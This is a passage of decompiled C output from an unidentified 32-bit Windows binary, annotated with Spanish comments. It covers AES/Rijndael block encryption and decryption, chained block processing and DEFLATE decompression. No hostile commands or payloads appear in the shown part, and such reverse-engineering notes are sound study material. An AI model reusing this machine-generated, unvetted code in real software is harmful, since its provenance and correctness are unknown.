                *(uint *)(&DAT_0040a3fc + (local_10 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00409bfc + (uVar4 >> 0x18) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_14 & 0xff) * 4) ^ puVar5[-2];
        puVar5 = puVar5 + 8;
        local_8 = local_8 + -1;
        local_14 = uVar7;
        local_10 = uVar2;
        local_c = uVar6;
      } while (local_8 != 0);
    }
    iVar3 = iVar3 * 0x20;
    uVar1 = *(undefined4 *)(iVar3 + 0x1e8 + (int)this);
    *param_2 = (&DAT_00408afc)[uVar4 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[1] = (&DAT_00408afc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[2] = (&DAT_00408afc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[3] = (&DAT_00408afc)[local_14 & 0xff] ^ (byte)local_8;
    uVar1 = *(undefined4 *)((int)this + iVar3 + 0x1ec);
    param_2[4] = (&DAT_00408afc)[local_14 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[5] = (&DAT_00408afc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[6] = (&DAT_00408afc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[7] = (&DAT_00408afc)[local_10 & 0xff] ^ (byte)local_8;
    uVar1 = *(undefined4 *)((int)this + iVar3 + 0x1f0);
    param_2[8] = (&DAT_00408afc)[local_10 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[9] = (&DAT_00408afc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[10] = (&DAT_00408afc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[0xb] = (&DAT_00408afc)[local_c & 0xff] ^ (byte)local_8;
    uVar1 = *(undefined4 *)((int)this + iVar3 + 500);
    param_2[0xc] = (&DAT_00408afc)[local_c >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[0xd] = (&DAT_00408afc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[0xe] = (&DAT_00408afc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[0xf] = (&DAT_00408afc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = this;
  exception::exception(local_30,&this_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_30,(ThrowInfo *)&pThrowInfo_0040d570);
}



/* Cifra bloques para claves de mayor tamaño mediante rondas extendidas. */
void __thiscall FUN_0040350f(void *this,uint *param_1,byte *param_2)

{
  uint *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  exception local_38 [12];
  uint local_2c;
  int local_28;
  int local_24;
  int local_20;
  uint *local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint *local_c;
  uint *local_8;
  
  if (*(char *)((int)this + 4) == '\0') {
    exception::exception(local_38,&this_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_38,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (*(int *)((int)this + 0x3cc) == 0x10) {
    FUN_00402e7e(this,param_1,param_2);
  }
  else {
    iVar3 = *(int *)((int)this + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (iVar3 != 6) + 1) * 0x20;
    local_1c = *(uint **)(&DAT_0040bc24 + iVar4);
    local_18 = *(int *)(&DAT_0040bc2c + iVar4);
    local_20 = *(int *)(&DAT_0040bc34 + iVar4);
    if (0 < iVar3) {
      puVar5 = (uint *)((int)this + 0x454);
      local_10 = iVar3;
      local_8 = (uint *)((int)this + 8);
      do {
        *puVar5 = (uint)(byte)*param_1 << 0x18;
        *puVar5 = *puVar5 | (uint)*(byte *)((int)param_1 + 1) << 0x10;
        *puVar5 = *puVar5 | (uint)*(byte *)((int)param_1 + 2) << 8;
        *puVar5 = *puVar5 | (uint)*(byte *)((int)param_1 + 3);
        puVar1 = local_8 + 1;
        param_1 = param_1 + 1;
        *puVar5 = *puVar5 ^ *local_8;
        local_10 = local_10 + -1;
        puVar5 = puVar5 + 1;
        local_8 = puVar1;
      } while (local_10 != 0);
    }
    local_10 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      local_c = (uint *)((int)this + 0x28);
      do {
        if (0 < iVar3) {
          local_8 = local_c;
          local_24 = local_18 - (int)local_1c;
          param_1 = local_1c;
          local_28 = local_20 - (int)local_1c;
          puVar5 = (uint *)((int)this + 0x434);
          local_14 = iVar3;
          do {
            local_2c = (uint)*(byte *)((int)this + ((local_24 + (int)param_1) % iVar3) * 4 + 0x455);
            puVar1 = local_8 + 1;
            *puVar5 = *(uint *)(&DAT_004093fc + local_2c * 4) ^
                      *(uint *)(&DAT_004097fc +
                               (*(uint *)((int)this +
                                         ((local_28 + (int)param_1) % iVar3) * 4 + 0x454) & 0xff) *
                               4) ^
                      *(uint *)(&DAT_00408ffc +
                               (uint)*(byte *)((int)this + ((int)param_1 % iVar3) * 4 + 0x456) * 4)
                      ^ *(uint *)(&DAT_00408bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^
                      *local_8;
            puVar5 = puVar5 + 1;
            param_1 = (uint *)((int)param_1 + 1);
            local_14 = local_14 + -1;
            local_8 = puVar1;
          } while (local_14 != 0);
        }
        memcpy((void *)((int)this + 0x454),(void *)((int)this + 0x434),iVar3 << 2);
        local_c = local_c + 8;
        local_10 = local_10 + 1;
      } while (local_10 < *(int *)((int)this + 0x410));
    }
    local_8 = (uint *)0x0;
    if (0 < iVar3) {
      pbVar6 = param_2;
      iVar4 = local_18;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar2 = *(undefined4 *)
                 ((int)this + ((int)local_8 + *(int *)((int)this + 0x410) * 8) * 4 + 8);
        *pbVar6 = (&DAT_004089fc)[param_2[3]] ^ (byte)((uint)uVar2 >> 0x18);
        pbVar6[1] = (&DAT_004089fc)
                    [*(byte *)((int)this +
                              (((int)local_1c + (iVar4 - local_18)) % iVar3) * 4 + 0x456)] ^
                    (byte)((uint)uVar2 >> 0x10);
        pbVar6[2] = (&DAT_004089fc)[*(byte *)((int)this + (iVar4 % iVar3) * 4 + 0x455)] ^
                    (byte)((uint)uVar2 >> 8);
        param_1._0_1_ = (byte)uVar2;
        pbVar6[3] = (&DAT_004089fc)
                    [*(uint *)((int)this + (((local_20 - local_18) + iVar4) % iVar3) * 4 + 0x454) &
                     0xff] ^ (byte)param_1;
        pbVar6 = pbVar6 + 4;
        local_8 = (uint *)((int)local_8 + 1);
        iVar4 = iVar4 + 1;
        param_2 = param_2 + 4;
      } while ((int)local_8 < iVar3);
    }
  }
  return;
}



/* Descifra bloques para claves de mayor tamaño mediante rondas extendidas. */
void __thiscall FUN_00403797(void *this,byte *param_1,byte *param_2)

{
  uint *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  exception local_38 [12];
  uint local_2c;
  int local_28;
  int local_24;
  int local_20;
  byte *local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint *local_c;
  uint *local_8;
  
  if (*(char *)((int)this + 4) == '\0') {
    exception::exception(local_38,&this_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_38,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (*(int *)((int)this + 0x3cc) == 0x10) {
    FUN_004031bc(this,param_1,param_2);
  }
  else {
    iVar3 = *(int *)((int)this + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (iVar3 != 6) + 1) * 0x20;
    local_1c = *(byte **)(&DAT_0040bc28 + iVar4);
    local_18 = *(int *)(&DAT_0040bc30 + iVar4);
    local_20 = *(int *)(&DAT_0040bc38 + iVar4);
    if (0 < iVar3) {
      puVar5 = (uint *)((int)this + 0x454);
      local_10 = iVar3;
      local_8 = (uint *)((int)this + 0x1e8);
      do {
        *puVar5 = (uint)*param_1 << 0x18;
        *puVar5 = *puVar5 | (uint)param_1[1] << 0x10;
        *puVar5 = *puVar5 | (uint)param_1[2] << 8;
        *puVar5 = *puVar5 | (uint)param_1[3];
        puVar1 = local_8 + 1;
        param_1 = param_1 + 4;
        *puVar5 = *puVar5 ^ *local_8;
        local_10 = local_10 + -1;
        puVar5 = puVar5 + 1;
        local_8 = puVar1;
      } while (local_10 != 0);
    }
    local_10 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      local_c = (uint *)((int)this + 0x208);
      do {
        if (0 < iVar3) {
          local_8 = local_c;
          local_24 = local_18 - (int)local_1c;
          param_1 = local_1c;
          local_28 = local_20 - (int)local_1c;
          puVar5 = (uint *)((int)this + 0x434);
          local_14 = iVar3;
          do {
            local_2c = (uint)*(byte *)((int)this + ((int)(param_1 + local_24) % iVar3) * 4 + 0x455);
            puVar1 = local_8 + 1;
            *puVar5 = *(uint *)(&DAT_0040a3fc + local_2c * 4) ^
                      *(uint *)(&DAT_0040a7fc +
                               (*(uint *)((int)this +
                                         ((int)(param_1 + local_28) % iVar3) * 4 + 0x454) & 0xff) *
                               4) ^
                      *(uint *)(&DAT_00409ffc +
                               (uint)*(byte *)((int)this + ((int)param_1 % iVar3) * 4 + 0x456) * 4)
                      ^ *(uint *)(&DAT_00409bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^
                      *local_8;
            puVar5 = puVar5 + 1;
            param_1 = param_1 + 1;
            local_14 = local_14 + -1;
            local_8 = puVar1;
          } while (local_14 != 0);
        }
        memcpy((void *)((int)this + 0x454),(void *)((int)this + 0x434),iVar3 << 2);
        local_c = local_c + 8;
        local_10 = local_10 + 1;
      } while (local_10 < *(int *)((int)this + 0x410));
    }
    local_8 = (uint *)0x0;
    if (0 < iVar3) {
      pbVar6 = param_2;
      iVar4 = local_18;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar2 = *(undefined4 *)
                 ((int)this + ((int)local_8 + *(int *)((int)this + 0x410) * 8) * 4 + 0x1e8);
        *pbVar6 = (&DAT_00408afc)[param_2[3]] ^ (byte)((uint)uVar2 >> 0x18);
        pbVar6[1] = (&DAT_00408afc)
                    [*(byte *)((int)this +
                              ((int)(local_1c + (iVar4 - local_18)) % iVar3) * 4 + 0x456)] ^
                    (byte)((uint)uVar2 >> 0x10);
        pbVar6[2] = (&DAT_00408afc)[*(byte *)((int)this + (iVar4 % iVar3) * 4 + 0x455)] ^
                    (byte)((uint)uVar2 >> 8);
        param_1._0_1_ = (byte)uVar2;
        pbVar6[3] = (&DAT_00408afc)
                    [*(uint *)((int)this + (((local_20 - local_18) + iVar4) % iVar3) * 4 + 0x454) &
                     0xff] ^ (byte)param_1;
        pbVar6 = pbVar6 + 4;
        local_8 = (uint *)((int)local_8 + 1);
        iVar4 = iVar4 + 1;
        param_2 = param_2 + 4;
      } while ((int)local_8 < iVar3);
    }
  }
  return;
}



/* Aplica XOR entre un bloque y una clave/estado del mismo tamaño. */
void __thiscall FUN_00403a28(void *this,byte *param_1,byte *param_2)

{
  int iVar1;
  exception local_10 [12];
  
  if (*(char *)((int)this + 4) != '\0') {
    iVar1 = 0;
    if (0 < *(int *)((int)this + 0x3cc)) {
      do {
        *param_1 = *param_1 ^ *param_2;
        param_2 = param_2 + 1;
        param_1 = param_1 + 1;
        iVar1 = iVar1 + 1;
      } while (iVar1 < *(int *)((int)this + 0x3cc));
    }
    return;
  }
  exception::exception(local_10,&this_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
}



/* Procesa datos por bloques usando cifrado, descifrado o encadenamiento. */
void __thiscall FUN_00403a77(void *this,byte *param_1,byte *param_2,uint param_3,uint param_4)

{
  uint uVar1;
  bool bVar2;
  exception local_10 [12];
  
  if (*(char *)((int)this + 4) == '\0') {
    exception::exception(local_10,&this_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (param_3 != 0) {
    uVar1 = *(uint *)((int)this + 0x3cc);
    if ((int)((ulonglong)param_3 % (ulonglong)uVar1) == 0) {
      if (param_4 == 1) {
        param_4 = 0;
        if ((int)(((ulonglong)param_3 % (ulonglong)uVar1 << 0x20 | (ulonglong)param_3) /
                 (ulonglong)uVar1) != 0) {
          do {
            FUN_00403797(this,param_1,param_2);
            FUN_00403a28(this,param_2,(byte *)((int)this + 0x3f0));
            memcpy((void *)((int)this + 0x3f0),param_1,*(size_t *)((int)this + 0x3cc));
            uVar1 = *(uint *)((int)this + 0x3cc);
            param_1 = param_1 + uVar1;
            param_2 = param_2 + uVar1;
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar1);
        }
      }
      else {
        bVar2 = param_4 == 2;
        param_4 = 0;
        if (bVar2) {
          if (param_3 / uVar1 != 0) {
            do {
              FUN_0040350f(this,(uint *)((int)this + 0x3f0),param_2);
              FUN_00403a28(this,param_2,param_1);
              memcpy((void *)((int)this + 0x3f0),param_1,*(size_t *)((int)this + 0x3cc));
              uVar1 = *(uint *)((int)this + 0x3cc);
              param_1 = param_1 + uVar1;
              param_2 = param_2 + uVar1;
              param_4 = param_4 + 1;
            } while (param_4 < param_3 / uVar1);
          }
        }
        else if (param_3 / uVar1 != 0) {
          do {
            FUN_00403797(this,param_1,param_2);
            uVar1 = *(uint *)((int)this + 0x3cc);
            param_1 = param_1 + uVar1;
            param_2 = param_2 + uVar1;
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar1);
        }
      }
      return;
    }
  }
  exception::exception(local_10,&PTR_DAT_0040f574);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
}



/* Copia datos desde el anillo de salida y actualiza el estado del flujo. */
int __cdecl FUN_00403bd6(int param_1,void *param_2,int param_3)

{
  void *_Src;
  uint uVar1;
  void *pvVar2;
  undefined4 uVar3;
  void *pvVar4;
  uint uVar5;
  undefined4 local_8;
  
  pvVar2 = param_2;
  _Src = *(void **)(param_1 + 0x30);
  pvVar4 = *(void **)(param_1 + 0x34);
  local_8 = *(void **)((int)param_2 + 0xc);
  if (pvVar4 < _Src) {
    pvVar4 = *(void **)(param_1 + 0x2c);
  }
  uVar1 = *(uint *)((int)param_2 + 0x10);
  uVar5 = (int)pvVar4 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar4 - (int)_Src)) {
    uVar5 = uVar1;
  }
  if ((uVar5 != 0) && (param_3 == -5)) {
    param_3 = 0;
  }
  *(int *)((int)param_2 + 0x14) = *(int *)((int)param_2 + 0x14) + uVar5;
  *(uint *)((int)param_2 + 0x10) = uVar1 - uVar5;
  if (*(code **)(param_1 + 0x38) != (code *)0x0) {
    uVar3 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),_Src,uVar5);
    *(undefined4 *)(param_1 + 0x3c) = uVar3;
    *(undefined4 *)((int)param_2 + 0x30) = uVar3;
  }
  param_2 = _Src;
  if (uVar5 != 0) {
    memcpy(local_8,_Src,uVar5);
    local_8 = (void *)((int)local_8 + uVar5);
    param_2 = (void *)((int)_Src + uVar5);
  }
  if (param_2 == *(void **)(param_1 + 0x2c)) {
    param_2 = *(void **)(param_1 + 0x28);
    if (*(void **)(param_1 + 0x34) == *(void **)(param_1 + 0x2c)) {
      *(void **)(param_1 + 0x34) = param_2;
    }
    uVar1 = *(uint *)((int)pvVar2 + 0x10);
    uVar5 = *(int *)(param_1 + 0x34) - (int)param_2;
    if (uVar1 < uVar5) {
      uVar5 = uVar1;
    }
    if ((uVar5 != 0) && (param_3 == -5)) {
      param_3 = 0;
    }
    *(int *)((int)pvVar2 + 0x14) = *(int *)((int)pvVar2 + 0x14) + uVar5;
    *(uint *)((int)pvVar2 + 0x10) = uVar1 - uVar5;
    if (*(code **)(param_1 + 0x38) != (code *)0x0) {
      uVar3 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),param_2,uVar5);
      *(undefined4 *)(param_1 + 0x3c) = uVar3;
      *(undefined4 *)((int)pvVar2 + 0x30) = uVar3;
    }
    if (uVar5 != 0) {
      memcpy(local_8,param_2,uVar5);
      local_8 = (void *)((int)local_8 + uVar5);
      param_2 = (void *)((int)param_2 + uVar5);
    }
  }
  *(void **)((int)pvVar2 + 0xc) = local_8;
  *(void **)(param_1 + 0x30) = param_2;
  return param_3;
}



/* Registra un bloque almacenado sin compresion en la maquina de estados DEFLATE. */
void __cdecl
FUN_00403cc8(undefined1 param_1,undefined1 param_2,undefined4 param_3,undefined4 param_4,int param_5
            )

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = 0;
    *(undefined1 *)(puVar1 + 4) = param_1;
    *(undefined1 *)((int)puVar1 + 0x11) = param_2;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



/* Decodifica bloques DEFLATE: literales, longitudes, distancias y tablas dinamicas. */
void __cdecl FUN_00403cfc(uint param_1,int *param_2,int param_3)

{
  int *piVar1;
  byte bVar2;
  int *piVar3;
  undefined1 *puVar4;
  int iVar5;
  uint uVar6;
  int *piVar7;
  uint uVar8;
  undefined1 *puVar9;
  undefined1 *puVar10;
  byte *local_18;
  undefined1 *local_14;
  undefined1 *local_10;
  uint local_c;
  byte *local_8;
  
  piVar7 = param_2;
  uVar6 = param_1;
  local_8 = (byte *)*param_2;
  local_c = param_2[1];
  puVar10 = *(undefined1 **)(param_1 + 0x34);
  param_2 = *(int **)(param_1 + 0x20);
  piVar3 = *(int **)(param_1 + 4);
  if (puVar10 < *(undefined1 **)(param_1 + 0x30)) {
    local_10 = *(undefined1 **)(param_1 + 0x30) + (-1 - (int)puVar10);
    param_1 = *(uint *)(param_1 + 0x1c);
  }
  else {
    local_10 = (undefined1 *)(*(int *)(param_1 + 0x2c) - (int)puVar10);
    param_1 = *(uint *)(param_1 + 0x1c);
  }
  do {
    switch(*piVar3) {
    case 0:
      if (((undefined1 *)0x101 < local_10) && (9 < local_c)) {
        *(int **)(uVar6 + 0x20) = param_2;
        *(uint *)(uVar6 + 0x1c) = param_1;
        piVar7[1] = local_c;
        iVar5 = *piVar7;
        *piVar7 = (int)local_8;
        piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
        *(undefined1 **)(uVar6 + 0x34) = puVar10;
        param_3 = FUN_0040514d((uint)*(byte *)(piVar3 + 4),(uint)*(byte *)((int)piVar3 + 0x11),
                               piVar3[5],piVar3[6],uVar6,piVar7);
        local_8 = (byte *)*piVar7;
        local_c = piVar7[1];
        puVar10 = *(undefined1 **)(uVar6 + 0x34);
        param_2 = *(int **)(uVar6 + 0x20);
        param_1 = *(uint *)(uVar6 + 0x1c);
        if (puVar10 < *(undefined1 **)(uVar6 + 0x30)) {
          local_10 = *(undefined1 **)(uVar6 + 0x30) + (-1 - (int)puVar10);
        }
        else {
          local_10 = (undefined1 *)(*(int *)(uVar6 + 0x2c) - (int)puVar10);
        }
        if (param_3 != 0) {
          *piVar3 = (-(uint)(param_3 != 1) & 2) + 7;
          break;
        }
      }
      piVar3[3] = (uint)*(byte *)(piVar3 + 4);
      piVar3[2] = piVar3[5];
      *piVar3 = 1;
    case 1:
      for (; param_1 < (uint)piVar3[3]; param_1 = param_1 + 8) {
        if (local_c == 0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c - 1;
        param_2 = (int *)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      local_18 = (byte *)(piVar3[2] + (*(uint *)(&DAT_0040bca8 + piVar3[3] * 4) & (uint)param_2) * 8
                         );
      param_2 = (int *)((uint)param_2 >> (local_18[1] & 0x1f));
      param_1 = param_1 - local_18[1];
      bVar2 = *local_18;
      uVar8 = (uint)bVar2;
      if (uVar8 == 0) {
        iVar5 = *(int *)(local_18 + 4);
        *piVar3 = 6;
        piVar3[2] = iVar5;
      }
      else if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) == 0) {
LAB_00403f71:
          piVar3[3] = uVar8;
          piVar3[2] = (int)(local_18 + *(int *)(local_18 + 4) * 8);
        }
        else {
          if ((bVar2 & 0x20) == 0) {
            *piVar3 = 9;
            piVar7[6] = (int)s_invalid_literal_length_code_0040f630;
switchD_00403d47_caseD_9:
            param_3 = -3;
            *(int **)(uVar6 + 0x20) = param_2;
            *(uint *)(uVar6 + 0x1c) = param_1;
            piVar7[1] = local_c;
            iVar5 = *piVar7;
            *piVar7 = (int)local_8;
            piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
            *(undefined1 **)(uVar6 + 0x34) = puVar10;
            goto LAB_00404278;
          }
          *piVar3 = 7;
        }
      }
      else {
        piVar3[2] = uVar8 & 0xf;
        piVar3[1] = *(int *)(local_18 + 4);
        *piVar3 = 2;
      }
      break;
    case 2:
      for (; param_1 < (uint)piVar3[2]; param_1 = param_1 + 8) {
        if (local_c == 0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c - 1;
        param_2 = (int *)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      uVar8 = *(uint *)(&DAT_0040bca8 + piVar3[2] * 4) & (uint)param_2;
      *piVar3 = 3;
      param_2 = (int *)((uint)param_2 >> ((byte)piVar3[2] & 0x1f));
      piVar3[1] = piVar3[1] + uVar8;
      param_1 = param_1 - piVar3[2];
      piVar3[3] = (uint)*(byte *)((int)piVar3 + 0x11);
      piVar3[2] = piVar3[6];
    case 3:
      for (; param_1 < (uint)piVar3[3]; param_1 = param_1 + 8) {
        if (local_c == 0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c - 1;
        param_2 = (int *)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      local_18 = (byte *)(piVar3[2] + (*(uint *)(&DAT_0040bca8 + piVar3[3] * 4) & (uint)param_2) * 8
                         );
      param_2 = (int *)((uint)param_2 >> (local_18[1] & 0x1f));
      param_1 = param_1 - local_18[1];
      bVar2 = *local_18;
      uVar8 = (uint)bVar2;
      if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) == 0) goto LAB_00403f71;
        *piVar3 = 9;
        piVar7[6] = (int)s_invalid_distance_code_0040f618;
        goto switchD_00403d47_caseD_9;
      }
      piVar3[2] = uVar8 & 0xf;
      piVar3[3] = *(int *)(local_18 + 4);
      *piVar3 = 4;
      break;
    case 4:
      for (; param_1 < (uint)piVar3[2]; param_1 = param_1 + 8) {
        if (local_c == 0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c - 1;
        param_2 = (int *)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      uVar8 = *(uint *)(&DAT_0040bca8 + piVar3[2] * 4) & (uint)param_2;
      *piVar3 = 5;
      param_2 = (int *)((uint)param_2 >> ((byte)piVar3[2] & 0x1f));
      piVar3[3] = piVar3[3] + uVar8;
      param_1 = param_1 - piVar3[2];
    case 5:
      local_14 = puVar10 + -piVar3[3];
      if (local_14 < *(undefined1 **)(uVar6 + 0x28)) {
        do {
          local_14 = local_14 + (*(int *)(uVar6 + 0x2c) - (int)*(undefined1 **)(uVar6 + 0x28));
        } while (local_14 < *(undefined1 **)(uVar6 + 0x28));
      }
      iVar5 = piVar3[1];
      while (iVar5 != 0) {
        puVar9 = puVar10;
        if (local_10 == (undefined1 *)0x0) {
          if (puVar10 == *(undefined1 **)(uVar6 + 0x2c)) {
            local_10 = *(undefined1 **)(uVar6 + 0x30);
            puVar9 = *(undefined1 **)(uVar6 + 0x28);
            if (local_10 != puVar9) {
              if (puVar9 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar9);
              }
              else {
                local_10 = *(undefined1 **)(uVar6 + 0x2c) + -(int)puVar9;
              }
              puVar10 = puVar9;
              if (local_10 != (undefined1 *)0x0) goto LAB_00404090;
            }
          }
          *(undefined1 **)(uVar6 + 0x34) = puVar10;
          param_3 = FUN_00403bd6(uVar6,piVar7,param_3);
          puVar9 = *(undefined1 **)(uVar6 + 0x34);
          puVar10 = *(undefined1 **)(uVar6 + 0x30);
          if (puVar9 < puVar10) {
            local_10 = puVar10 + (-1 - (int)puVar9);
          }
          else {
            local_10 = (undefined1 *)(*(int *)(uVar6 + 0x2c) - (int)puVar9);
          }
          if ((puVar9 == *(undefined1 **)(uVar6 + 0x2c)) &&
             (puVar4 = *(undefined1 **)(uVar6 + 0x28), puVar10 != puVar4)) {
            puVar9 = puVar4;
            if (puVar4 < puVar10) {
              local_10 = puVar10 + (-1 - (int)puVar4);
            }
            else {
              local_10 = *(undefined1 **)(uVar6 + 0x2c) + -(int)puVar4;
            }
          }
          if (local_10 == (undefined1 *)0x0) goto LAB_004041b5;
        }
LAB_00404090:
        param_3 = 0;
        *puVar9 = *local_14;
        puVar10 = puVar9 + 1;
        local_14 = local_14 + 1;
        local_10 = local_10 + -1;
        if (local_14 == *(undefined1 **)(uVar6 + 0x2c)) {
          local_14 = *(undefined1 **)(uVar6 + 0x28);
        }
        piVar1 = piVar3 + 1;
        *piVar1 = *piVar1 + -1;
        iVar5 = *piVar1;
      }
LAB_00404157:
      *piVar3 = 0;
      break;
    case 6:
      puVar9 = puVar10;
      if (local_10 != (undefined1 *)0x0) {
LAB_00404149:
        param_3 = 0;
        *puVar9 = (char)piVar3[2];
        puVar10 = puVar9 + 1;
        local_10 = local_10 + -1;
        goto LAB_00404157;
      }
      if (puVar10 == *(undefined1 **)(uVar6 + 0x2c)) {
        local_10 = *(undefined1 **)(uVar6 + 0x30);
        puVar9 = *(undefined1 **)(uVar6 + 0x28);
        if (local_10 != puVar9) {
          if (puVar9 < local_10) {
            local_10 = local_10 + (-1 - (int)puVar9);
          }
          else {
            local_10 = *(undefined1 **)(uVar6 + 0x2c) + -(int)puVar9;
          }
          puVar10 = puVar9;
          if (local_10 != (undefined1 *)0x0) goto LAB_00404149;
        }
      }
      *(undefined1 **)(uVar6 + 0x34) = puVar10;
      param_3 = FUN_00403bd6(uVar6,piVar7,param_3);
      puVar9 = *(undefined1 **)(uVar6 + 0x34);
      puVar10 = *(undefined1 **)(uVar6 + 0x30);
      if (puVar9 < puVar10) {
        local_10 = puVar10 + (-1 - (int)puVar9);
      }
      else {
        local_10 = (undefined1 *)(*(int *)(uVar6 + 0x2c) - (int)puVar9);
      }
      if ((puVar9 == *(undefined1 **)(uVar6 + 0x2c)) &&
         (puVar4 = *(undefined1 **)(uVar6 + 0x28), puVar10 != puVar4)) {
        puVar9 = puVar4;
        if (puVar4 < puVar10) {
          local_10 = puVar10 + (-1 - (int)puVar4);
        }
        else {
          local_10 = *(undefined1 **)(uVar6 + 0x2c) + -(int)puVar4;
        }
      }
      if (local_10 != (undefined1 *)0x0) goto LAB_00404149;
LAB_004041b5:
      *(int **)(uVar6 + 0x20) = param_2;
      *(uint *)(uVar6 + 0x1c) = param_1;
      piVar7[1] = local_c;
      puVar10 = puVar9;
      goto LAB_004041c7;
    case 7:
      if (7 < param_1) {
        param_1 = param_1 - 8;
        local_c = local_c + 1;
        local_8 = local_8 + -1;
      }
      *(undefined1 **)(uVar6 + 0x34) = puVar10;
      param_3 = FUN_00403bd6(uVar6,piVar7,param_3);
      puVar10 = *(undefined1 **)(uVar6 + 0x34);
      if (*(undefined1 **)(uVar6 + 0x30) == puVar10) {
        *piVar3 = 8;
switchD_00403d47_caseD_8:
        param_3 = 1;
        *(int **)(uVar6 + 0x20) = param_2;
        *(uint *)(uVar6 + 0x1c) = param_1;
        piVar7[1] = local_c;
        iVar5 = *piVar7;
        *piVar7 = (int)local_8;
        piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
        *(undefined1 **)(uVar6 + 0x34) = puVar10;
      }
      else {
        *(int **)(uVar6 + 0x20) = param_2;
        *(uint *)(uVar6 + 0x1c) = param_1;
        piVar7[1] = local_c;
        iVar5 = *piVar7;
        *piVar7 = (int)local_8;
        piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
        *(undefined1 **)(uVar6 + 0x34) = puVar10;
      }
LAB_00404278:
      FUN_00403bd6(uVar6,piVar7,param_3);
      return;
    case 8:
      goto switchD_00403d47_caseD_8;
    case 9:
      goto switchD_00403d47_caseD_9;
    default:
      param_3 = -2;
      *(int **)(uVar6 + 0x20) = param_2;
      *(uint *)(uVar6 + 0x1c) = param_1;
      piVar7[1] = local_c;
      iVar5 = *piVar7;
      *piVar7 = (int)local_8;
      piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
      *(undefined1 **)(uVar6 + 0x34) = puVar10;
      goto LAB_00404278;
    }
  } while( true );
LAB_0040415f:
  *(int **)(uVar6 + 0x20) = param_2;
  *(uint *)(uVar6 + 0x1c) = param_1;
  piVar7[1] = 0;
LAB_004041c7:
  iVar5 = *piVar7;
  *piVar7 = (int)local_8;
  piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
  *(undefined1 **)(uVar6 + 0x34) = puVar10;
  goto LAB_00404278;
}



/* Libera una tabla de codigos DEFLATE usando el asignador del flujo. */
void __cdecl FUN_004042af(undefined4 param_1,int param_2)

{
